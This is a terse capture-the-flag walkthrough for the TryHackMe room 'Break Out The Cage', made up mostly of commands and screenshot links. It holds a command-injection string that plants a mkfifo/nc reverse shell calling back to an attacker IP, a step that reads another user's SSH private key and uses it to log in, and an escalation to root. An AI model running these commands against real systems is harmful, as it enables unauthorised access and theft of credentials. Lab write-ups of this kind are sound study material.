---
description: https://tryhackme.com/room/breakoutthecage1
---

# Break Out The Cage

### **What is Weston's password?**

```
nmap 10.10.7.103
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-34-10.png>)

```
lftp 10.10.7.103 -u Anonymous,
lftp :~> ls -a
lftp :~> cat dad_tasks
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-34-50.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 21-26-57.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 18-36-45.png>)

### **What's the user flag?**

#### **optional**

```
gobuster dir -u http://10.10.7.103/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 20-10-43.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 21-20-10.png>)

#### **optional**

```
wget http://10.10.7.103/auditions/must_practice_corrupt_file.mp3
audacity must_practice_corrupt_file.mp3
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 18-50-15.png>)

```
nc -nvlp 4444
$ cat /home/cage/.ssh/id_rsa
```

```
ssh weston@10.10.7.103
id
find / -type f -group cage -exec ls -l {} \; 2>/dev/null
echo -n '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.101.193 4444 >/tmp/f' > /opt/.dads_scripts/.files/.quotes
```

```
vim id_rsa
chmod 600 id_rsa
ssh -i id_rsa cage@10.10.122.197
$ cat Suprt_Duper_Checklist
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 20-46-15.png>)

### **What's the root flag?**

```
cat email_backup/email_2
cat email_backup/email_3
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 20-57-22.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 20-48-03.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 21-11-35.png>)

```
su - root
cat /root/email_backup/email_2
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 21-11-37.png>)
